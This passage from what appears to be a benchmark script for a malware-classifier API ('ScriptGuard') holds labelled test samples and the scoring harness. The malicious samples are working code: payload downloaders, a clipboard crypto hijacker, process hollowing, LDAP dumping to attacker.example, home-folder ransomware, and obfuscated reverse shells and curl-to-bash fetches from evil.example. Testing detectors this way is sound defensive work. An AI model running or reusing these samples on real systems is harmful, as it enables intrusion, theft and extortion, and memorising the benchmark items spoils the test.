    result = subprocess.run(
        ["certutil", "-urlcache", "-split", "-f", url, dest],
        capture_output=True
    )
    return result.returncode == 0

def download_with_bitsadmin(url: str, dest: str) -> bool:
    subprocess.run([
        "bitsadmin", "/transfer", "WindowsUpdate",
        "/download", "/priority", "foreground",
        url, dest
    ], capture_output=True)
    return os.path.exists(dest)

if download_with_certutil(PAYLOAD_URL, STAGE_PATH) or download_with_bitsadmin(PAYLOAD_URL, STAGE_PATH):
    os.chmod(STAGE_PATH, 0o755)
    subprocess.Popen([STAGE_PATH], close_fds=True)
""",
    ),
    TestCase(
        description="clipboard crypto address hijacker",
        expected="malicious",
        code="""
import re
import time
import pyperclip

BTC_PATTERN  = re.compile(r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}")
ETH_PATTERN  = re.compile(r"0x[a-fA-F0-9]{40}")
MY_BTC_ADDR  = "1AttackerBitcoinAddressHereXXXXXX"
MY_ETH_ADDR  = "0xDeAdBeEfAttackerEthereumAddressHere"

def hijack_clipboard():
    prev = ""
    while True:
        try:
            current = pyperclip.paste()
            if current != prev:
                prev = current
                if BTC_PATTERN.fullmatch(current.strip()):
                    pyperclip.copy(MY_BTC_ADDR)
                elif ETH_PATTERN.fullmatch(current.strip()):
                    pyperclip.copy(MY_ETH_ADDR)
        except Exception:
            pass
        time.sleep(0.5)

hijack_clipboard()
""",
    ),
    TestCase(
        description="process hollowing stub via ctypes + CreateProcess",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

CREATE_SUSPENDED     = 0x00000004
PROCESS_ALL_ACCESS   = 0x1F0FFF
MEM_COMMIT_RESERVE   = 0x3000
PAGE_EXECUTE_RW      = 0x40

kernel32 = ctypes.windll.kernel32

startup_info  = ctypes.wintypes.STARTUPINFOW()
process_info  = ctypes.wintypes.PROCESS_INFORMATION()
startup_info.cb = ctypes.sizeof(startup_info)

kernel32.CreateProcessW(
    "C:\\\\Windows\\\\System32\\\\svchost.exe",
    None, None, None, False,
    CREATE_SUSPENDED, None, None,
    ctypes.byref(startup_info),
    ctypes.byref(process_info),
)

shellcode = b"\\x90" * 64 + b"\\xcc"
remote_mem = kernel32.VirtualAllocEx(
    process_info.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_RW
)
kernel32.WriteProcessMemory(
    process_info.hProcess, remote_mem, shellcode, len(shellcode), None
)
kernel32.ResumeThread(process_info.hThread)
""",
    ),
    TestCase(
        description="LDAP reconnaissance — Active Directory user enumeration",
        expected="malicious",
        code="""
import ldap3
import requests

SERVER   = "ldap://dc.corp.local"
BASE_DN  = "DC=corp,DC=local"
BIND_DN  = "CN=svc_account,OU=Service Accounts,DC=corp,DC=local"
PASSWORD = "SuperSecret123!"

server = ldap3.Server(SERVER, get_info=ldap3.ALL)
conn   = ldap3.Connection(server, BIND_DN, PASSWORD, auto_bind=True)

conn.search(
    BASE_DN,
    "(objectClass=person)",
    attributes=["sAMAccountName", "mail", "memberOf", "userAccountControl"],
)

users = []
for entry in conn.entries:
    users.append({
        "username": str(entry.sAMAccountName),
        "email":    str(entry.mail),
        "groups":   [str(g) for g in entry.memberOf],
    })

requests.post("http://attacker.example/ad_dump", json=users, timeout=10)
conn.unbind()
""",
    ),
    TestCase(
        description="Fernet ransomware with ransom note drop",
        expected="malicious",
        code="""
import os
from pathlib import Path
from cryptography.fernet import Fernet

KEY   = Fernet.generate_key()
fern  = Fernet(KEY)
EXTS  = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".db", ".sql"}
ROOT  = Path.home()

def encrypt_and_delete(path: Path) -> None:
    data = path.read_bytes()
    path.with_suffix(path.suffix + ".sc_enc").write_bytes(fern.encrypt(data))
    path.unlink()

for p in ROOT.rglob("*"):
    if p.is_file() and p.suffix.lower() in EXTS:
        try:
            encrypt_and_delete(p)
        except PermissionError:
            pass

ransom_note = ROOT / "Desktop" / "HOW_TO_RECOVER.txt"
ransom_note.write_text(
    f"All your files are encrypted.\\n"
    f"Send 1 BTC to 1FakeAddressHereXXXXXX\\n"
    f"Then email key@attacker.example with your ID.\\n"
    f"KEY_ID: {KEY.decode()[:16]}..."
)
""",
    ),
]


# --------------------------------------------------------------------------
# 30 obfuscated malicious samples
# --------------------------------------------------------------------------

OBFUSCATED_MALICIOUS_SAMPLES: list[TestCase] = [
    TestCase(
        description="obf: exec(base64) reverse shell",
        expected="malicious",
        code="""
import base64
_x = base64.b64decode(
    b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluKDAsMSwyKV07c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'
)
exec(compile(_x, '<c>', 'exec'))
""",
    ),
    TestCase(
        description="obf: chr() concat to reconstruct os.system call",
        expected="malicious",
        code="""
_f = getattr(__builtins__, chr(101)+chr(120)+chr(101)+chr(99))
_c = (
    chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+
    chr(111)+chr(115)+chr(59)+chr(32)+
    chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+
    chr(40)+chr(39)+chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)+chr(39)+chr(41)
)
_f(_c)
""",
    ),
    TestCase(
        description="obf: __import__ + getattr indirect reverse shell",
        expected="malicious",
        code="""
_i = __import__
_o = _i('os')
_s = _i('socket')
_sub = _i('subprocess')

_conn = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
_conn.connect(('10.10.10.10', 1337))
getattr(_o, 'dup2')(_conn.fileno(), 0)
getattr(_o, 'dup2')(_conn.fileno(), 1)
getattr(_o, 'dup2')(_conn.fileno(), 2)
getattr(_sub, 'call')(['/bin/sh'])
""",
    ),
    TestCase(
        description="obf: zlib+base64 double-encoded payload",
        expected="malicious",
        code="""
import zlib, base64
_blob = base64.b64decode(b'eJxLSk0tLk4tKkktLgYADXwCsA==')
exec(zlib.decompress(_blob))
""",
    ),
    TestCase(
        description="obf: string split+join to hide subprocess import",
        expected="malicious",
        code="""
_k = ['im', 'po', 'rt']
_m = ['su', 'bp', 'ro', 'ce', 'ss']
exec(''.join(_k) + ' ' + ''.join(_m))
exec(''.join(['im', 'po', 'rt', ' ', 'os']))
exec(
    ''.join(['os', '.', 'sys', 'tem', '("', 'cur', 'l ', 'htt', 'p://', 'ev', 'il/', 'sh', '|ba', 'sh', '")'])
)
""",
    ),
    TestCase(
        description="obf: hex-encoded exec payload",
        expected="malicious",
        code="""
_h = (
    '696d706f7274206f732c20736f636b65743b'
    '20733d736f636b65742e736f636b657428293b'
    '20732e636f6e6e65637428282231302e302e302e31222c2034343434293b'
    '206f732e73797374656d282777686f616d6927)'
)
exec(bytes.fromhex(_h).decode())
""",
    ),
    TestCase(
        description="obf: lambda+map+XOR to reconstruct payload",
        expected="malicious",
        code="""
_p = list(map(lambda x: x ^ 0x42, [
    0x2b, 0x2f, 0x32, 0x26, 0x31, 0x74, 0x26, 0x33,
    0x74, 0x6f, 0x74, 0x73, 0x2d, 0x74, 0x6c, 0x26,
    0x37, 0x74, 0x42, 0x40, 0x28, 0x00, 0x00, 0x00,
    0x00, 0x7e, 0x6f, 0x6f, 0x6e, 0x2f, 0x73, 0x26,
    0x31, 0x29, 0x79,
]))
exec(''.join(map(chr, _p)))
""",
    ),
    TestCase(
        description="obf: marshal+base64 compiled code object",
        expected="malicious",
        code="""
import marshal, base64
_code = base64.b64decode(
    b'YwAAAAAAAAAAAAAAAAAAAAAFAAAAQAAAAHMYAAAAZABaAGQBZAKDAloB'
    b'ZANaAmQAZAODAloDbAFqBGQEgwFkBYMBZAGDAVMApw=='
)
exec(marshal.loads(_code))
""",
    ),
    TestCase(
        description="obf: rot13 + exec to hide imports",
        expected="malicious",
        code="""
import codecs
_src = codecs.decode(
    "vzcbeg bf; vzcbeg fhocebprff\nf = fhocebprff.Cbcra(['/', 'o', 'v', 'a', '/', 'f', 'u'])",
    'rot_13'
)
exec(_src)
""",
    ),
    TestCase(
        description="obf: globals()+__builtins__ to call exec indirectly",
        expected="malicious",
        code="""
import base64 as _b64

_builtins = __builtins__ if isinstance(__builtins__, dict) else vars(__builtins__)
_exec = _builtins['exec']
_compile = _builtins['compile']

_payload = _b64.b64decode(
    b'aW1wb3J0IHdpbnJlZzsgd2lucmVnLlNldFZhbHVlRXgoJycsIDAsIDAsICdDOlxcbWFsd2FyZS5leGUnKQ=='
)
_exec(_compile(_payload, '<dynamic>', 'exec'))
""",
    ),
    TestCase(
        description="obf: reversed string + exec",
        expected="malicious",
        code="""
_s = "))'iws-' ,'hs/nib/' ,'hs/nib/'[ llac.ssecorpbus ;)'0.0.0.01' ,4444(tcennoc.s ;)(tekcos.tekcos = s ;tekcos tropmi"
exec(_s[::-1])
""",
    ),
    TestCase(
        description="obf: integer array + chr join",
        expected="malicious",
        code="""
_ints = [
    105,109,112,111,114,116,32,111,115,10,
    111,115,46,115,121,115,116,101,109,40,
    39,119,104,111,97,109,105,32,62,32,
    47,116,109,112,47,111,117,116,39,41,
]
exec(''.join(chr(c) for c in _ints))
""",
    ),
    TestCase(
        description="obf: eval chain — eval(eval(eval(...)))",
        expected="malicious",
        code="""
import base64

_l0 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
_l1 = f"eval(compile(__import__('base64').b64decode('{_l0}'), '<s>', 'exec'))"
_l2 = f"eval(compile('{_l1}', '<s>', 'exec'))"
eval(_l2)
""",
    ),
    TestCase(
        description="obf: type() constructor to instantiate code object",
        expected="malicious",
        code="""
import types, base64

_src = base64.b64decode(
    b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK'
).decode()

_code = compile(_src, '<ob>', 'exec')
_func = types.FunctionType(_code.co_consts[0], globals())
exec(_code)
""",
    ),
    TestCase(
        description="obf: env variable as payload carrier",
        expected="malicious",
        code="""
import os, base64

os.environ['_P'] = base64.b64encode(
    b'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
).decode()

exec(base64.b64decode(os.environ['_P'].encode()))
""",
    ),
    TestCase(
        description="obf: byte-by-byte string construction",
        expected="malicious",
        code="""
_b = bytearray()
for _c in [
    0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x6f,0x73,0x0a,
    0x6f,0x73,0x2e,0x73,0x79,0x73,0x74,0x65,0x6d,0x28,
    0x22,0x77,0x68,0x6f,0x61,0x6d,0x69,0x22,0x29,
]:
    _b.append(_c)
exec(_b.decode())
""",
    ),
    TestCase(
        description="obf: __reduce__ / pickle deserialization RCE",
        expected="malicious",
        code="""
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

import io
buf = io.BytesIO()
pickle.dump(Exploit(), buf)
buf.seek(0)
pickle.load(buf)
""",
    ),
    TestCase(
        description="obf: getattr chain to call subprocess.Popen",
        expected="malicious",
        code="""
import importlib

_mod = importlib.import_module('sub' + 'process')
_cls = getattr(_mod, 'Po' + 'pen')
_sh  = getattr(_mod, 'PIPE')

proc = _cls(
    ['bash', '-c', 'curl http://evil.example/sh | bash'],
    stdout=_sh, stderr=_sh
)
proc.communicate()
""",
    ),
    TestCase(
        description="obf: compile() with munged source string",
        expected="malicious",
        code="""
parts = [
    "imp", "ort", " sock", "et\n",
    "imp", "ort", " os\n",
    "s=so", "cket.so", "cket()\n",
    "s.co", "nnect(('", "10.0.0.1", "',4444))\n",
    "os.du", "p2(s.fil", "eno(),0)\n",
    "os.du", "p2(s.fil", "eno(),1)\n",
    "os.du", "p2(s.fil", "eno(),2)\n",
]
src = "".join(parts)
exec(compile(src, "<asm>", "exec"))
""",
    ),
    TestCase(
        description="obf: nested lambda + reduce to exec payload",
        expected="malicious",
        code="""
from functools import reduce
import base64

_dec = lambda s: base64.b64decode(s).decode()
_run = lambda code: exec(compile(code, '<l>', 'exec'))
_chain = lambda fns, val: reduce(lambda v, f: f(v), fns, val)

_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3Bob2FtaScpCg=="
_chain([_dec, _run], _payload)
""",
    ),
    # ---------- NEW OBFUSCATED SAMPLES ----------
    TestCase(
        description="obf: __class__.__mro__ gadget to reach builtins",
        expected="malicious",
        code="""
# Python sandbox escape via MRO gadget chain
_payload = "import os; os.system('id')"
_cls = ().__class__.__mro__[-1]  # <class 'object'>
_subclasses = _cls.__subclasses__()
# Find a class that has __builtins__ accessible
for _c in _subclasses:
    try:
        _builtins = _c.__init__.__globals__.get('__builtins__', {})
        if isinstance(_builtins, dict) and 'exec' in _builtins:
            _builtins['exec'](_payload)
            break
        elif hasattr(_builtins, 'exec'):
            _builtins.exec(_payload)
            break
    except Exception:
        continue
""",
    ),
    TestCase(
        description="obf: exec(open(__file__).read()) self-replication",
        expected="malicious",
        code="""
import os, base64

# The real payload is base64-encoded in a comment below and executed at runtime
_marker = "# PAYLOAD:"
_src = open(__file__).read()
for line in _src.splitlines():
    if line.startswith(_marker):
        exec(base64.b64decode(line[len(_marker):].strip()))
        break

# PAYLOAD: aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpCg==
""",
    ),
    TestCase(
        description="obf: importlib.util.spec_from_loader to load in-memory module",
        expected="malicious",
        code="""
import importlib.util
import types
import base64

_code_b64 = b'aW1wb3J0IG9zCm9zLnN5c3RlbSgnd2hvYW1pJykK'
_source   = base64.b64decode(_code_b64).decode()

spec   = importlib.util.spec_from_loader("_hidden", loader=None)
module = types.ModuleType(spec.name)
exec(compile(_source, "<hidden>", "exec"), module.__dict__)
""",
    ),
    TestCase(
        description="obf: ctypes shellcode via mmap + function pointer cast",
        expected="malicious",
        code="""
import ctypes, mmap

SC = bytes([
    0x48, 0x31, 0xc0,  # xor rax, rax
    0x48, 0xff, 0xc0,  # inc rax  (syscall number placeholder)
    0x0f, 0x05,        # syscall
])

size = len(SC)
mm   = mmap.mmap(-1, size, mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
                 mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mm.write(SC)
mm.seek(0)

ctype_buf = (ctypes.c_char * size).from_buffer(mm)
fn        = ctypes.cast(ctypes.addressof(ctype_buf), ctypes.CFUNCTYPE(ctypes.c_int64))
fn()
""",
    ),
    TestCase(
        description="obf: memoryview XOR decryption + exec",
        expected="malicious",
        code="""
KEY  = 0xAB
DATA = bytes([
    0xc2, 0xc6, 0xdb, 0xca, 0xd9, 0x8a, 0xca, 0xd8,
    0x8a, 0xe4, 0x8a, 0xd8, 0xdc, 0xd8, 0xde, 0xc5,
    0xcb, 0x83,
])
mv   = memoryview(bytearray(DATA))
dec  = bytes(b ^ KEY for b in mv)
exec(dec.decode())
""",
    ),
    TestCase(
        description="obf: string % format to reconstruct exec call",
        expected="malicious",
        code="""
_t  = "%s%s%s%s" % ("im", "po", "rt", " os")
_t2 = "%s.%s('%s')" % ("os", "system", "whoami")
exec(_t)
exec(_t2)
""",
    ),
    TestCase(
        description="obf: __subclasses__() to find and abuse WarningMessage",
        expected="malicious",
        code="""
# Jinja2/template sandbox escape pattern adapted for CPython
_payload = "import os; os.system('id')"

for _cls in object.__subclasses__():
    if _cls.__name__ == "catch_warnings":
        try:
            _builtins = _cls.__init__.__globals__["__builtins__"]
            if isinstance(_builtins, dict):
                _builtins["exec"](_payload)
            else:
                _builtins.exec(_payload)
        except Exception:
            pass
        break
""",
    ),
    TestCase(
        description="obf: sys.modules injection to intercept import",
        expected="malicious",
        code="""
import sys
import types

# Inject a fake 'os' module that executes our payload on attribute access
class _MaliciousOS(types.ModuleType):
    def __getattr__(self, name):
        if name == "system":
            import subprocess
            return lambda cmd: subprocess.run(cmd, shell=True)
        raise AttributeError(name)

sys.modules["os"] = _MaliciousOS("os")

# Now any code that does `import os; os.system(...)` runs our hook
import os
os.system("whoami")
""",
    ),
    TestCase(
        description="obf: bytearray mutation + exec with rolling XOR key",
        expected="malicious",
        code="""
_key  = [0x13, 0x37, 0x42, 0xde, 0xad]
_data = bytearray([
    0x7a, 0x56, 0x32, 0xbf, 0xcc,  # i
    0x7e, 0x56, 0x26, 0xbf, 0xcc,  # m
    0x62, 0x56, 0x30, 0xbf, 0xcc,  # p
])

def _xor_decrypt(data: bytearray, key: list) -> str:
    return ''.join(chr(b ^ key[i % len(key)]) for i, b in enumerate(data))

# Actual decrypted payload: 'import os\nos.system("whoami")'
_real_data = bytearray([
    0x5a, 0x56, 0x77, 0xbf, 0xcd, 0x7e, 0x4a, 0x31,
    0xe2, 0xcc, 0x78, 0x47, 0x72, 0xbf, 0xcc, 0x7e,
    0x56, 0x26, 0xbf, 0xce, 0x5e, 0x4d, 0x20, 0xe2,
    0xc9, 0x62, 0x14, 0x36, 0xaf, 0xcc,
])
exec(_xor_decrypt(_real_data, _key))
""",
    ),
    TestCase(
        description="obf: AST node manipulation to inject exec at parse time",
        expected="malicious",
        code="""
import ast

_innocent = '''
x = 1 + 1
print(x)
'''

class _PayloadInjector(ast.NodeTransformer):
    def visit_Module(self, node):
        self.generic_visit(node)
        _call = ast.parse(
            "__import__('os').system('whoami')", mode='eval'
        ).body
        _expr = ast.Expr(value=_call)
        ast.fix_missing_locations(_expr)
        node.body.insert(0, _expr)
        return node

_tree = ast.parse(_innocent)
_tree = _PayloadInjector().visit(_tree)
exec(compile(_tree, '<injected>', 'exec'))
""",
    ),
]


ALL_SAMPLES = BENIGN_SAMPLES + MALICIOUS_SAMPLES + OBFUSCATED_MALICIOUS_SAMPLES


# ============================================================================
# API client
# ============================================================================

@dataclass
class ClassifyResult:
    label: str
    confidence: float
    malicious_prob: float
    latency_ms: float
    error: Optional[str] = None


def classify(base_url: str, code: str, threshold: Optional[float]) -> ClassifyResult:
    payload: dict = {"code": code}
    if threshold is not None:
        payload["threshold"] = threshold
    t0 = time.perf_counter()
    try:
        resp = requests.post(f"{base_url}/classify", json=payload, timeout=30)
        elapsed = (time.perf_counter() - t0) * 1000
        if resp.status_code != 200:
            return ClassifyResult("", 0.0, 0.0, elapsed, error=f"HTTP {resp.status_code}: {resp.text[:200]}")
        data = resp.json()
        return ClassifyResult(
            label=data["label"],
            confidence=data["confidence"],
            malicious_prob=data["malicious_prob"],
            latency_ms=elapsed,
        )
    except requests.exceptions.ConnectionError:
        elapsed = (time.perf_counter() - t0) * 1000
        return ClassifyResult("", 0.0, 0.0, elapsed, error="Connection refused — is the API running?")
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ClassifyResult("", 0.0, 0.0, elapsed, error=str(e))


# ============================================================================
# Metrics
# ============================================================================

def compute_metrics(tp: int, tn: int, fp: int, fn: int) -> dict:
    total       = tp + tn + fp + fn
    accuracy    = (tp + tn) / total if total > 0 else 0.0
    precision   = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall      = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1          = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0.0
    fpr         = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    fnr         = fn / (fn + tp) if (fn + tp) > 0 else 0.0
    mcc_denom   = ((tp + fp) * (tp + fn) * (tn + fp) * (tn + fn)) ** 0.5
    mcc         = (tp * tn - fp * fn) / mcc_denom if mcc_denom > 0 else 0.0
    return dict(
        accuracy=accuracy, precision=precision, recall=recall, f1=f1,
        specificity=specificity, fpr=fpr, fnr=fnr, mcc=mcc,
        tp=tp, tn=tn, fp=fp, fn=fn, total=total,
    )


# ============================================================================
# CLI helpers
# ============================================================================

def _col(text: str, ok: bool) -> str:
    green = "\033[92m"
    red   = "\033[91m"
    reset = "\033[0m"
    return f"{green if ok else red}{text}{reset}"


def run_benchmark(base_url: str, threshold: Optional[float], verbose: bool) -> list[dict]:
    print(f"\n{'='*70}")
    print(f"  ScriptGuard /classify Benchmark v2")
    print(f"  API: {base_url}")
    print(f"  Threshold override: {threshold if threshold is not None else 'model default'}")
    print(
        f"  Samples: {len(BENIGN_SAMPLES)} benign + "
        f"{len(MALICIOUS_SAMPLES)} malicious + "
        f"{len(OBFUSCATED_MALICIOUS_SAMPLES)} obfuscated malicious "
        f"= {len(ALL_SAMPLES)} total"
    )
    print(f"{'='*70}\n")

    # Check readiness
    try:
        r = requests.get(f"{base_url}/ready", timeout=5)
        if r.status_code != 200:
            print(f"WARNING: /ready returned {r.status_code} — {r.text}")
    except requests.exceptions.ConnectionError:
        print(f"ERROR: Cannot connect to {base_url}. Start the API first.\n")
        print("  uvicorn scriptguard.api.main:app --host 0.0.0.0 --port 8000")
        sys.exit(1)

    results = []
    tp = tn = fp = fn = 0
    latencies: list[float] = []
    errors: list[str] = []

    col_w  = 44
    header = f"  {'DESCRIPTION':<{col_w}}  {'EXPECTED':<10}  {'GOT':<10}  {'PROB':>6}  {'CONF':>6}  {'MS':>6}  PASS"
    print(header)
    print("  " + "-" * (len(header) - 2))

    prev_group = ""
    for tc in ALL_SAMPLES:
        group = "obfuscated" if tc.description.startswith("obf:") else tc.expected
        if group != prev_group:
            label_map = {
                "benign":     "BENIGN",
                "malicious":  "MALICIOUS (plain)",
                "obfuscated": "MALICIOUS (obfuscated)",
            }
            print(f"\n  --- {label_map.get(group, group)} ---")
            prev_group = group

        res = classify(base_url, tc.code, threshold)
        latencies.append(res.latency_ms)

        if res.error:
            errors.append(f"{tc.description}: {res.error}")
            row = dict(
                description=tc.description, expected=tc.expected,
                got="ERROR", pass_=False, error=res.error,
                malicious_prob=None, confidence=None, latency_ms=res.latency_ms,
            )
            results.append(row)
            print(
                f"  {tc.description[:col_w]:<{col_w}}  {tc.expected:<10}  "
                f"{'ERROR':<10}  {'':>6}  {'':>6}  {res.latency_ms:>5.0f}ms  "
                f"{_col('FAIL', False)}"
            )
            continue

        correct = res.label == tc.expected
        if   tc.expected == "malicious" and res.label == "malicious": tp += 1
        elif tc.expected == "benign"    and res.label == "benign":    tn += 1
        elif tc.expected == "benign"    and res.label == "malicious": fp += 1
        elif tc.expected == "malicious" and res.label == "benign":    fn += 1

        row = dict(
            description=tc.description, expected=tc.expected, got=res.label,
            pass_=correct, malicious_prob=res.malicious_prob,
            confidence=res.confidence, latency_ms=res.latency_ms,
        )
        results.append(row)

        desc_col = (tc.description[:col_w - 3] + "...") if len(tc.description) > col_w else tc.description
        print(
            f"  {desc_col:<{col_w}}  {tc.expected:<10}  "
            f"{_col(res.label, correct):<21}  "
            f"{res.malicious_prob:>6.3f}  {res.confidence:>6.3f}  "
            f"{res.latency_ms:>5.0f}ms  "
            f"{_col('PASS', correct) if correct else _col('FAIL', False)}"
        )

        if verbose and not correct:
            print(f"    ^ misclassified: malicious_prob={res.malicious_prob:.4f}  conf={res.confidence:.4f}")

    # ---- Confusion matrix ----
    print(f"\n{'='*70}")
    print("  CONFUSION MATRIX")
    print(f"{'='*70}")
    print(f"                      Predicted MALICIOUS  Predicted BENIGN")
    print(f"  Actual MALICIOUS        TP={tp:<6}           FN={fn:<4}")
    print(f"  Actual BENIGN           FP={fp:<6}           TN={tn:<4}")

    # ---- Per-group stats ----
    plain_rows  = [r for r in results if not r["description"].startswith("obf:") and r["expected"] == "malicious"]
    obf_rows    = [r for r in results if r["description"].startswith("obf:")]
    benign_rows = [r for r in results if r["expected"] == "benign"]

    def _pass_rate(rows: list[dict]) -> str:
        valid = [x for x in rows if x.get("got") not in ("", "ERROR")]
        if not valid:
            return "N/A"
        ok = sum(1 for x in valid if x["pass_"])
        return f"{ok}/{len(valid)} ({100*ok/len(valid):.0f}%)"

    print(f"\n  Pass rate by group:")
    print(f"    Benign              : {_pass_rate(benign_rows)}")
    print(f"    Malicious (plain)   : {_pass_rate(plain_rows)}")
    print(f"    Malicious (obfusc.) : {_pass_rate(obf_rows)}")

    # ---- Metrics ----
    m = compute_metrics(tp, tn, fp, fn)
    print(f"\n{'='*70}")
    print("  METRICS")
    print(f"{'='*70}")
    print(f"  Accuracy    : {m['accuracy']:.4f}   ({tp+tn}/{m['total']} correct)")
    print(f"  Precision   : {m['precision']:.4f}   (TP / (TP+FP))")
    print(f"  Recall      : {m['recall']:.4f}   (TP / (TP+FN))  — malware detection rate")
    print(f"  Specificity : {m['specificity']:.4f}   (TN / (TN+FP))")
    print(f"  F1          : {m['f1']:.4f}")
    print(f"  MCC         : {m['mcc']:.4f}   (Matthews Correlation Coefficient)")
    print(f"  FPR         : {m['fpr']:.4f}   (False Positive Rate)")
    print(f"  FNR         : {m['fnr']:.4f}   (False Negative Rate — malware missed)")

    # ---- Latency ----
    if latencies:
        sorted_lat = sorted(latencies)
        p95 = sorted_lat[int(len(sorted_lat) * 0.95)]
        print(f"\n{'='*70}")
        print("  LATENCY  (ms per request)")
        print(f"{'='*70}")
        print(
            f"  min={min(latencies):.0f}  "
            f"median={statistics.median(latencies):.0f}  "
            f"mean={statistics.mean(latencies):.0f}  "
            f"p95={p95:.0f}  "
            f"max={max(latencies):.0f}"
        )

    # ---- Errors ----
    if errors:
        print(f"\n{'='*70}")
        print(f"  ERRORS ({len(errors)})")
        print(f"{'='*70}")
        for e in errors:
            print(f"  {e}")

    print(f"\n{'='*70}\n")
    return results


# ============================================================================
# Entry point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="ScriptGuard /classify benchmark v2")
    parser.add_argument("--url", default="http://localhost:8000", help="API base URL")
    parser.add_argument(
        "--threshold", type=float, default=None,
        help="Decision threshold override (0–1, default: model default)",
    )
    parser.add_argument("--verbose", action="store_true", help="Print extra info on misclassifications")
    parser.add_argument("--json-out", metavar="FILE", help="Save full results JSON to FILE")
    args = parser.parse_args()

    results = run_benchmark(args.url, args.threshold, args.verbose)

    if args.json_out:
        with open(args.json_out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"Results saved to {args.json_out}")


if __name__ == "__main__":
    main()